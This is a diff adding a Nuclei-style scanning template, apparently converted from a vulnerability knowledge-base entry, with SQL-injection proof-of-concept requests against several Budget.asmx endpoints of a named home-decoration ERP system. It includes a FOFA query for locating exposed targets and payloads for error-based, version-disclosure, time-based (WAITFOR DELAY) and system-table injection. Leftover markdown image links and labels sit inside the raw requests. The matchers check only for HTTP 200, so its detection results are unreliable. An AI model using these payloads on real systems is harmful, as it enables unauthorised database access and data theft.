@@ -1,0 +1,103 @@
+id: poc-gouwxwhwoeymqf0o
+info:
+  name: 装盟科技-家装ERP管理系统 Budget.asmx 多处存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gouwxwhwoeymqf0o'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gouwxwhwoeymqf0o
+    fofa: app="装盟科技-家装ERP管理系统"
+http:
+- raw:
+  - 'POST /WEB_SERVICE/Budget.asmx/getFixedBaseInfo HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    where=1=db_name()&intPageIndex=1&pageSize=20
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744202560609-1c5a6887-2f2d-404f-9da6-75bc75a38559.png)
+
+    **PoC-2**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /WEB_SERVICE/Budget.asmx/EditBudName?code=@@VERSION&name=string HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744202560922-15ddcc0c-5bbe-4de7-9c6c-347d71009509.png)
+
+    **PoC-3**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /WEB_SERVICE/Budget.asmx/DyDes?code='';WAITFOR+DELAY+''0:0:5''--&info=string HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744202561234-b2a87e9b-7638-40e2-b76c-9669397bf51d.png)
+
+    **PoC-4**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /WEB_SERVICE/Budget.asmx/GetSelectTable?tableName=master.dbo.sysdatabases&strWhere=1=@@VERSION HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744202561472-16cd1572-1f65-4c43-aae5-3451abd04a28.png)
+
+    **PoC-5**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
